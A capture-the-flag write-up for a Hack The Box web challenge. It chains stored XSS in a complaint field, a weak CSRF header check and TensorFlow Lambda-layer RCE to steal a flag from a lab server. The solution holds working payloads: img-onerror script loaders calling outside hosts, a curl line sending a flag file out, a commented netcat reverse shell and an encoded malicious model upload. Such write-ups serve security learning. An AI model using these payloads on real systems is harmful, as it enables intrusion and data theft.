# Web

## Description

It looks like the AI hype has reached further than we thought. Help us shut down this poor alien attempt at Machine Learning, we found their website with a restricted admin dashboard can you exploit it?

## Source

`conf/nginx.conf`
```ini
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
daemon off;

events {
        worker_connections 768;
}

http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        access_log /dev/stdout;
        access_log /dev/stderr;

        server {
            listen 1337 default_server;
            listen [::]:1337 default_server;
            server_name _;
            location / {
                proxy_pass http://127.0.0.1:8080;
            }
            location /api/ {
                proxy_pass http://127.0.0.1:5000;
            }
        }
}
```

`challege/backend/app.py`
```python
import os
import string
import random
from threading import Thread
from dotenv import load_dotenv
from flask_session import Session
from flask import Flask, jsonify, request, send_from_directory, session

import complaints
from auth import authenticated
from csrf import csrf_protection
from model import test_model, dataset, predict

load_dotenv()

app = Flask(__name__)

app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_FILE_DIR'] = 'sessions/'
app.config['SESSION_COOKIE_NAME'] = 'space_cookie'
app.config['SESSION_COOKIE_SECURE'] = False 
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

app.secret_key = os.environ.get("FLASK_SECRET_KEY")

Session(app)

ALIEN_USERNAME = os.environ.get("ALIENT_USERNAME")
ALIENT_PASSWORD = os.environ.get("ALIENT_PASSWORD")

MODELS = "models/"
MAIN_MODEL = "models/main.h5"
    
def message(content: str):
    return jsonify({"message": content})

@app.route("/api/login", methods=["POST"])
def api_login():
    username = request.json.get("username", None)
    password = request.json.get("password", None)

    if not username or not password:
        return message("Paramters 'username' and 'password' required"), 400
    
    if username == ALIEN_USERNAME and password == ALIENT_PASSWORD:
        session['username'] = username
        return jsonify(), 200
    else:
        return message("Invalid credentials"), 401

@app.route("/api/metrics", methods=["GET"])
def get_metrics():
    metrics = test_model(MAIN_MODEL)
    return jsonify(metrics)

@app.route("/api/data", methods=["GET"])
def get_dataset():
    return jsonify({"count":dataset()})

@app.route("/api/predict", methods=["POST"])
@csrf_protection
def do_predition():
    image_data = request.json.get("image_data", None)
    if image_data == None:
        return message("Parameter 'image_data' required!"), 400
    
    prediction = predict(image_data)
    return jsonify({"prediction": prediction}), 200

@app.route("/api/complaint", methods=["POST"])
@csrf_protection
def submit_complaint():
    description = request.json.get("description", None)
    image_data = request.json.get("image_data", None)
    prediction = request.json.get("prediction", None)
    if not description or not image_data or prediction == None:
        return message("Parameters 'description', 'image_data' and 'prediction' requred"), 400
    
    complaints.add_complaint(description, image_data, prediction)

    Thread(target=complaints.check_complaints, args=(ALIEN_USERNAME, ALIENT_PASSWORD,)).start()

    return jsonify(), 204

@app.route("/api/internal/model", methods=["POST"])
@authenticated
@csrf_protection
def submit_model():
    if "file" not in request.files:
        return message("Failed to upload model! You must specify a file!"), 400

    file = request.files["file"]
    
    if file and ".h5" in file.filename:
        name = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
        name += ".h5"
        # Save model
        file.save(os.path.join(MODELS, name))
        try:
            test_model(MODELS+name)
            return message(f"Success, model saved at: /models/{name}")
            
        except Exception as e:
            print(e)
            return message("Model was uploaded but there were some errors during testing"), 422
    else:
        return message("Failed to upload model!"), 400

@app.route("/api/internal/models/<path:path>")
@authenticated
def serve_models(path):
    return send_from_directory("models", path)

@app.route("/api/internal/complaints", methods=["GET"])
@authenticated
def get_complaints():
    return jsonify(complaints.get_all_complaints()), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

`challege/backend/complaints.py`
```python
import os
import json
import uuid
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options


COMPLAINS_STORAGE = "complaints/"

def add_complaint(description, image_data, prediction):
    complaint = {
        "description": description,
        "image_data": image_data,
        "prediction": prediction,
    }

    with open(os.path.join(COMPLAINS_STORAGE, f"{uuid.uuid4()}.json"), "w") as f:
        f.write(json.dumps(complaint))


def get_all_complaints():
    complaints = []
    for complaint in os.listdir(COMPLAINS_STORAGE):
        with open(os.path.join(COMPLAINS_STORAGE, complaint)) as f:
            complaints.append(json.loads(f.read()))

    return complaints

def check_complaints(username, password):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    browser = webdriver.Chrome(options=options)

    browser.get("http://127.0.0.1:1337/dashboard")

    browser.find_element(By.NAME, "username").send_keys(username)
    browser.find_element(By.NAME, "password").send_keys(password)
    browser.find_element(By.CLASS_NAME, "button-container").click()

    time.sleep(10)

    browser.quit()
```

`challege/backend/csrf.py`
```python
from functools import wraps
from flask import request, jsonify

# https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#custom-request-headers
def csrf_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        csrf_header = request.headers.get("X-SPACE-NO-CSRF")
        if csrf_header != "1":
            return jsonify({"error": "Invalid csrf token!"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
```

`challege/backend/model.py`
```python
import json
import random
from tensorflow import keras
from keras.datasets import mnist
from keras.utils.np_utils import to_categorical
from keras.models import Sequential
from keras.layers.core import Dense, Dropout, Activation

# Tensorflow: https://github.com/tensorflow/tensorflow/

MAIN_MODEL = "models/main.h5"

(X_train, y_train), (X_test, y_test) = mnist.load_data()

X_train = X_train.reshape(60000, 784)
X_test = X_test.reshape(10000, 784)
X_train = X_train.astype("float32")
X_test = X_test.astype("float32")

X_train /= 255
X_test /= 255

n_classes = 10
Y_train = to_categorical(y_train, n_classes)
Y_test = to_categorical(y_test, n_classes)

# Our revolutionary ML model
def build_model():
    model = Sequential()
    model.add(Dense(512, input_shape=(784,)))
    model.add(Activation("relu"))                            
    model.add(Dropout(0.2))

    model.add(Dense(512))
    model.add(Activation("relu"))
    model.add(Dropout(0.2))

    model.add(Dense(10))
    model.add(Activation("softmax"))

    model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")

    history = model.fit(X_train, Y_train,
            batch_size=128, epochs=20,
            verbose=2,
            validation_data=(X_test, Y_test))

    model.save(MAIN_MODEL)
    with open("graph.json", "w") as fp:
        json.dump(history.history, fp)

def predict(image_data):
    # What's the point anyway?
    return random.randrange(0, 9)


def test_model(path):
    m = keras.models.load_model(path)
    metrics = m.evaluate(X_test, Y_test)
    return {"loss":round(metrics[0], 3), "acc":round(metrics[1], 3)}

def dataset():
    return len(X_train)+len(X_test)
```
## Solution

![why-lambda.png](/assets/ctf/htb/web/why-lambda.png)

The application supports authentication, but it's just hardcoded to default values which are randomly generated 32 characters.
```python
@app.route("/api/login", methods=["POST"])
def api_login():
    username = request.json.get("username", None)
    password = request.json.get("password", None)
    if username == ALIEN_USERNAME and password == ALIENT_PASSWORD:
        session['username'] = username
        return jsonify(), 200
```

![why-lambda-1.png](/assets/ctf/htb/web/why-lambda-1.png)

The heart of the application seems to be the model. We are allowed a "demo" version where we draw a number and model guesses the number.

![why-lambda-2.png](/assets/ctf/htb/web/why-lambda-2.png)

The model is somewhat terrible at it's job, so we are allowed to submit complaints. Our complaint is saved into a json file, the bot visits `/dashboard` with Chromium, stays there for 10 seconds and leaves.

```python
@app.route("/api/complaint", methods=["POST"])
@csrf_protection
def submit_complaint():
    description = request.json.get("description", None)
    image_data = request.json.get("image_data", None)
    prediction = request.json.get("prediction", None)
    if not description or not image_data or prediction == None:
        return message("Parameters 'description', 'image_data' and 'prediction' requred"), 400
    
    complaints.add_complaint(description, image_data, prediction)

    Thread(target=complaints.check_complaints, args=(ALIEN_USERNAME, ALIENT_PASSWORD,)).start()

    return jsonify(), 204
```

Vue on frontend takes the JSON data (complaints) and renders each item on `/dashboard`. The bot logins with admin credentials so XSS/CSRF seems likely.

![why-lambda-3.png](/assets/ctf/htb/web/why-lambda-3.png)

Only CSRF would work, because `HTTPONLY` is set for cookies, meaning they cannot be transmitted over network, no cookies for us 😟
```python
app.config['SESSION_COOKIE_SECURE'] = False 
app.config['SESSION_COOKIE_HTTPONLY'] = True
```

App does have CSRF protection, but from source we know it's easily bypassable with simple header 💀

We are also allowed to submit our own models, but only with "internal" API

![why-lambda-4.png](/assets/ctf/htb/web/why-lambda-4.png)

```python
@app.route("/api/internal/model", methods=["POST"])
@authenticated
@csrf_protection
def submit_model():
```

The model is handled by `tensorflow` 
```python
from tensorflow import keras
def test_model(path):
    m = keras.models.load_model(path)
    metrics = m.evaluate(X_test, Y_test)
    return {"loss":round(metrics[0], 3), "acc":round(metrics[1], 3)}
```

Quick google shows RCE vulnerability: [TensorFlow Remote Code Execution with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)

```python
import tensorflow as tf

def exploit(x):
    import os
    # os.system("touch /tmp/pwned")
	# os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
	os.system("curl https://uwuos.free.beeceptor.com -F 'file=@/app/flag.txt'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Ok, we have RCE... but how do we sneak it in? The obvious `script` tags wont work: [Injecting \<script\>alert("1")\</script\> to OWASP Juice shop doesn't work](https://security.stackexchange.com/a/199850)

No problem, we can load script via `img` `onerror` event:
```html
<img src=x onerror='var s=document.createElement(`script`);s.src=`https://pastebin.com/raw/KN1TVRkr`;document.body.appendChild(s)'>
```

::: info Note
`pastebin` won't work, more info later.
:::

Now we need a malicious CSRF script to do the heavy work.

First let's create the PoC. 
Phew... `9.8K` is kinda a lot..... Ideal way to sneak it in would be to use `Base64`, but it's still to big. Luckily modern Javascript supports decompression: [https://developer.mozilla.org/en-US/docs/Web/API/DecompressionStream](https://developer.mozilla.org/en-US/docs/Web/API/DecompressionStream)

```bash
root@9ee6d173a93e:/tmp/t# python3 exp.py
root@9ee6d173a93e:/tmp/t# ls -l exploit.h5
-rw-r--r-- 1 root root 9952 Sep 22 21:29 exploit.h5
root@9ee6d173a93e:/tmp/t# gzip -9 exploit.h5
root@9ee6d173a93e:/tmp/t# ls -l exploit.h5.gz
-rw-r--r-- 1 root root 1382 Sep 22 21:29 exploit.h5.gz
root@9ee6d173a93e:/tmp/t# base64 exploit.h5.gz -w0 | wc -c
1844
```

Much better.

Final PoC after playing around:
```js
async function DecompressBlob(blob) {
  const ds = new DecompressionStream("gzip");
  const decompressedStream = blob.stream().pipeThrough(ds);
  return await new Response(decompressedStream).blob();
}

function uploadFile(file) {
  const reader = new FileReader();

  reader.onload = function(event) {
    const blob = new Blob([event.target.result], { type: file.type });
    const formData = new FormData();
    formData.append('file', blob, file.name); 
    fetch('/api/internal/model', {
      method: 'POST',
      body: formData,
      headers: { "X-SPACE-NO-CSRF": "1" }
    })
    .then(data => console.log('File uploaded successfully:', data))
    .catch(error => console.error('Error uploading file:', error));
  };
  reader.readAsArrayBuffer(file);
}

const base64GzipString = "H4sICEOM8GYCA2V4cGxvaXQuaDUA7VnNT+NGFLfDVwRsxUo9QLut0nS7qlSKnBAKrLQtTggJXwUWCiELcif2JDHxV/1BFlCkHre3PfbYY4973GOP/RM4Vfsv9NYbnbHHjsdLgBXaShX+HWzPmzdvZl7e+3ny/Et5cene8EfDDEYyyfQzY0wYFwRvHtFtv/9HcmfJ/QW5/57w5YNu3ziRjxH7qT6vvUkG7jwtFrH2RQTBQsapW4w7hnKR38T3Cmlz5P5ngtZTdQkqQhvKjaZtobZu2LIqn0IzJAvH65fXzHufxGs0rkeZMrHzAfMhk2Ra0ASWcAxNS9Y1JJ9gWXfkWDBXkpp3sCtyZaPMAnlOuvZqQGxBTbrWznDIToJa1z3XjucPUdfqcoNx18Vcae/vRNdeH2VvzLVnm0DWZK3hm7zO3l9s117/FXzADXntP5ib8YHxwB8fI+aDbh6fD9J6ClBrEmAYWzcEBR6jXKAZgo3wyXXw47U84bWbjM8HFRL3oyhPxtG8J4hzNKBCj3F65gnLUvlyGT8MXMkPzI35YfCS/ZQKG2tsKJGo+RGyU5nsFOdxS2APwYaapZt1RW93uSLgD4SztKgAy3I9kH6cSm/Dnxyo2TJQ0pOptEceSH6W9hUsSsF1n4Xkz6KGljXDsddwd8RQDdhiU5Bxt2A1gYG1n2mOokymZudyh0hZsk9caRotG9jTWWzAMoBpYWEdKBZEAhM0GlAKCfyJPcuZdKczmYouas2Nsh47U4JOlzxBTcFi23RgjzXVHU200WsEbyCdaxd5Gsv4sogvW210Ka/v4ecqv9TiS22+vrU0xwM+X+VXm/xWka/z+R2+0FrccVr8gYY1vzqaOZIqK9ZyqclJ5fzphjx3LFWkTG163alqK0p1e0au7u0eVSt5rja97Oxn5+3lQqa0XJBUsPdc2fyBP96v5NsH2lq2au3viY5UbnIrJ61CtrFyLM7rJXFaOZVKu/bq1hrgK80THq9ztcWLjX289G/y6m5OLMy0oaSXq5Vmu1aaNw40iV9HvfnTfMPdZr7AF1f5rSdPDjTkFO+HxNfDkIcE33tdH6P0dlwHpwVBRe4WBCzVHTscF541ShqYMkE7OkIIjJKBwGw4KopWHKFnnU7nsNNhuu+44L3n5oGiW1Z3pAptUxZDAo+IoCS81YMH+jwVWnNwoAmFGh2NBceydfXbp+vbhqkbPaIy1OvNIUhQBCfdiURFNjTdVLuShqLXADpMvNWBJcdAcUIeciwoQBWE8gi1kB+x1xw8lJuanydSHR2b2qZsQ6Fuuiwg4mVkOA71H8k22qhqyEo4SWULkXkDiCdC4I5QrwKB6Z5RTGBDdyqOQ9Zc5GZz87O5mcw0TvWm7i3EDZvQyvDE0LBkxc3BDPyam8W7RArQ7HJDB//oAxG+9N83g9fw5VAPniVUzYyQO/IK2gUK9cf0G2pzOD4DxIgRI0aMGDFixHh3bH+/sciif/f+udPop+sAv5L2a3JQ9et25c9oPYO0X35+N/3o14mj/rq+TszcuE485Mr7Lq2fvv6Erkd59VOm9/eUGHH9NFQ/9fN//AGt58fh5nvim1cT9DznpP3Px358e0h9SuuVSbuZutt8E/UX/f1nnCG1naAQfT/1HfH9ApMbYXIXpHDr16Gj6MU3b1Ix38S4Pd+8SL1fvvHzJMoX/1WeJB967edUnvT+rvnyC9o/Me52nvjx9Cpyro7Whf2oXLhlnkTP8d3vmpfnybt+1xwJBXfSlQ94fayvR59/+5Bl/DyWZIJ8xBhALSxPJBKsZ8vzVB97/ujyDPrtf/R/jA1W//PDOCdug38BHoOoAuAmAAA=";
let bytes = Uint8Array.from(atob(base64GzipString), c => c.charCodeAt(0));
let blob = new Blob([bytes], { type: "application/gzip" });
let data = await DecompressBlob(blob);

// console.log(Array.from(new Uint8Array(await dec.arrayBuffer())).map(byte => byte.toString(16).padStart(2, '0')).join(' '));

const file = new File([data], "example.h5", { type: "text/plain" });
uploadFile(file);
```

CSRF is possible from `prediction` value in compaint.

`challenge/frontend/src/views/Dashboard.vue`
```js
getPredictionText(complaint) {
	return `<p>Our amazing model said the image represented the digit: <b>${complaint.prediction}</b></p>`;
},
```

Payload for prediction:
```html
<img src=x onerror='const s=document.createElement(`script`);s.src=`https://paste.mozilla.org/mhaWH3JB/raw`;s.type=`module`;document.body.appendChild(s);'>
```

The pastebin version didn't work, because it needs `Content-Type: text/javascript`. Luckily `pipedream` platform supports different hooks for free! and we can take advantage of that. (I was lazy to open ngrok, lol)

![why-lambda-5.png](/assets/ctf/htb/web/why-lambda-5.png)

New payload:
```html
<img src=x onerror='const s=document.createElement(`script`);s.src=`https://eo28ovxki9li6rj.m.pipedream.net`;s.type=`module`;document.body.appendChild(s);'>
```

We create a script, give it a source of our payload, `type=module` because `await/async` kept complaining and lastly append the script to html. Bot should trigger the XSS in few seconds.

![why-lambda-6.png](/assets/ctf/htb/web/why-lambda-6.png)

![why-lambda-7.png](/assets/ctf/htb/web/why-lambda-7.png)

> Flag: `HTB{th3_gr33ks_g0t_1t_4ll_wr0ng}`

